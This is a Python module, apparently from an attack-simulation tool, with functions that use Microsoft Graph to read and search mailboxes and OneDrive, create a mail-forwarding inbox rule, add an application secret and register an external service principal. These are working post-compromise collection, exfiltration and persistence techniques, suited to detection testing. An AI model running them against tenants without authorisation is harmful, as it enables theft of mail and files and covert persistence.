import requests
import logging
import datetime
from src.auth import get_ms_token

### Graph

graph_scope = "https://graph.microsoft.com/.default"

def read_email_graph(auth_config, params, token=False):

    logging.info("Running the read_email technique using the Graph API")

    if not token:
        token = get_ms_token(auth_config, params['auth_method'], graph_scope)

    mailbox = params['mailbox']
    graph_endpoint = f'https://graph.microsoft.com/v1.0/users/{mailbox}/mailFolders/Inbox/messages'


    access_token = token['access_token']
    headers = {
        'Authorization': f'Bearer {access_token}',
        'Content-Type': 'application/json'
    }

    short_endpoint = graph_endpoint.replace("https://graph.microsoft.com","")
    logging.info(f"Submitting GET request to v1.0/users/me/mailFolders/Inbox/messages")
    response = requests.get(graph_endpoint, headers=headers)

    if response.status_code == 200:
        logging.info("200 OK")
        messages = response.json().get('value', [])
        for message in messages[:params['limit']]:
            #print(message.get('subject'), message.get('from'))
            #body_content = message.get('body', {}).get('content', '')
            logging.info(f"Read email with subject: {message.get('subject')}")
            #print("Body:", body_content)

    else:
        logging.error(f"Operation failed with status code {response.status_code }")
        #print (response.text)


def search_mailbox_graph(auth_config, params, token=False):

    logging.info("Running the search_mailbox technique using the Graph API")

    if not token:
        token = get_ms_token(auth_config, params['auth_method'], graph_scope)

    graph_endpoint = f'https://graph.microsoft.com/v1.0/search/query'

    access_token = token['access_token']
    headers = {
        'Authorization': f'Bearer {access_token}',
        'Content-Type': 'application/json'
    }

    keyword = params['keyword']
    limit = params ['limit']

    data = {
        "requests": [
            {
            "entityTypes": [
                "message"
            ],
            "query": {
                "queryString": keyword
            },
            "from": 0,
            "size": limit
            }
        ]
    }

    short_endpoint = graph_endpoint.replace("https://graph.microsoft.com","")
    logging.info(f"Submitting POST request to {short_endpoint}")
    response = requests.post(graph_endpoint, headers=headers, json=data)

    hits_found = False

    if response.status_code == 200:
        logging.info("200 OK")
        values = response.json().get('value', [])
        for value in values:
            for hitsContainer in value.get("hitsContainers", []):
                for hit in hitsContainer.get("hits", []):
                    hits_found = True
                    subject = hit["resource"]["subject"]
                    logging.info(f"Found email with subject: {subject}")
        #print (hits[0])
        #print (response.text)

        if not hits_found:
            logging.info("Request returned 0 results.")
    else:
        logging.error(f"Operation failed with status code {response.status_code }")
        print (response.text)



def search_onedrive_graph(auth_config, params, token=False):

    logging.info("Running the search_onedrive technique using the Graph API")

    if not token:
        token = get_ms_token(auth_config, params['auth_method'], graph_scope)

    graph_endpoint = f'https://graph.microsoft.com/v1.0/search/query'

    headers = {
        'Authorization': f'Bearer {token}',
        'Content-Type': 'application/json'
    }

    keyword = params['keyword']
    limit = params ['limit']

    data = {
        "requests": [
            {
            "entityTypes": [
                "driveItem"
            ],
            "query": {
                "queryString": keyword
            },
            "from": 0,
            "size": limit
            }
        ]
    }

    short_endpoint = graph_endpoint.replace("https://graph.microsoft.com","")
    logging.info(f"Submitting POST request to {short_endpoint}")
    response = requests.post(graph_endpoint, headers=headers, json=data)

    hits_found = False


    if response.status_code == 200:
        logging.info("200 OK")
        #print (response.text)
        values = response.json().get('value', [])
        for value in values:
            for hitsContainer in value.get("hitsContainers", []):
                for hit in hitsContainer.get("hits", []):
                    #print (hit['resource'].keys())
                    hits_found = True
                    name = hit['resource']['name']
                    created = hit['resource']['createdDateTime']
                    logging.info(f"Found file name: {name} created at {created}")

        if not hits_found:
            logging.info("Requested returned 0 results.")
        #print (hits[0])
        #print (response.text)


    else:
        logging.error(f"Operation failed with status code {response.status_code }")
        print (response.text)


def create_rule_graph(auth_config, params, token=False):

    logging.info("Running the create_rule technique using the Graph API")

    #graph_scope = "https://graph.microsoft.com/MailboxSettings.ReadWrite"
    #graph_scope = "MailboxSettings.ReadWrite"

    #https://learn.microsoft.com/en-us/graph/api/resources/messageruleactions?view=graph-rest-1.0
    mailbox = params['mailbox']
    rule_name = params['rule_name']
    forward_to = params ['forward_to']
    body_contains = params ['body_contains']

    graph_endpoint = f'https://graph.microsoft.com/v1.0/users/{mailbox}/mailFolders/Inbox/messageRules'
    #graph_endpoint = f'https://graph.microsoft.com/v1.0/users/me/mailFolders/Inbox/messageRules'

    if not token:
        token = get_ms_token(auth_config, params['auth_method'], graph_scope)

    headers = {
        'Authorization': f'Bearer {token}',
        'Content-Type': 'application/json'
    }

    data = {
        "displayName": rule_name,
        "sequence": 1,
        "isEnabled": True,
        "conditions": {
            "bodyContains": [
            body_contains 
            ]
        },
        "actions": {
            "forwardTo": [
            {
                "emailAddress": {
                    "address": forward_to 
                }
            }
            ],
            "stopProcessingRules": True
        }
    }
    
    short_endpoint = graph_endpoint.replace("https://graph.microsoft.com","")
    logging.info(f"Submitting POSt request to {short_endpoint}")
    response = requests.post(graph_endpoint, headers=headers, json=data)

    if response.status_code == 201:
        logging.info("201 - Created")
    else:
        logging.error(f"Operation failed with status code {response.status_code }")
        #print (response.text)    
        

def add_application_secret_graph(auth_config, params, token=False):

    logging.info("Running the add_secret technique using the Graph API")

    if not token:
        token = get_ms_token(auth_config, params['auth_method'], graph_scope)

    app_object_id = params['app_id']
    #secret_description = params['description']
    secret_description = params.get('description', 'Simulation Secret')
    secret_duration = params.get('secret_duration', 90)  # Duration in days
    end_date = (datetime.datetime.utcnow() + datetime.timedelta(days=secret_duration)).isoformat() + "Z"
    
    graph_endpoint = f'https://graph.microsoft.com/v1.0/applications/{app_object_id}/addPassword'

    access_token = token['access_token']
    headers = {
        'Authorization': f'Bearer {access_token}',
        'Content-Type': 'application/json'
    }

    data = {
        "passwordCredential": {
            "displayName": secret_description,
            "endDateTime": end_date
        }
    }

    short_endpoint = graph_endpoint.replace("https://graph.microsoft.com", "")
    logging.info(f"Submitting POST request to {short_endpoint}")
    response = requests.post(graph_endpoint, headers=headers, json=data)

    if response.status_code == 200:
        logging.info("200 OK - Secret added successfully")
        secret_id = response.json().get('keyId')
        logging.info(f"Added secret with ID: {secret_id}")
    else:
        logging.error(f"Operation failed with status code {response.status_code}")
        print(response.text)


def add_service_principal(auth_config, params, token=False):

    logging.info("Running the add_service_principal technique using the Graph API")

    if not token:
        token = get_ms_token(auth_config, params['auth_method'], graph_scope)

    app_id = params['app_id']  # The App ID (client ID) of the external multi-tenant app
    graph_endpoint = 'https://graph.microsoft.com/v1.0/servicePrincipals'

    access_token = token['access_token']
    headers = {
        'Authorization': f'Bearer {access_token}',
        'Content-Type': 'application/json'
    }

    data = {
        "appId": app_id
    }

    short_endpoint = graph_endpoint.replace("https://graph.microsoft.com", "")
    logging.info(f"Submitting POST request to {short_endpoint}")
    response = requests.post(graph_endpoint, headers=headers, json=data)

    if response.status_code == 201:
        logging.info("201 Created - Service principal for external app added successfully")
        print (response.json())
        service_principal_id = response.json().get('id')
        logging.info(f"Service principal ID: {service_principal_id}")
    else:
        logging.error(f"Operation failed with status code {response.status_code}")
        print(response.text)
        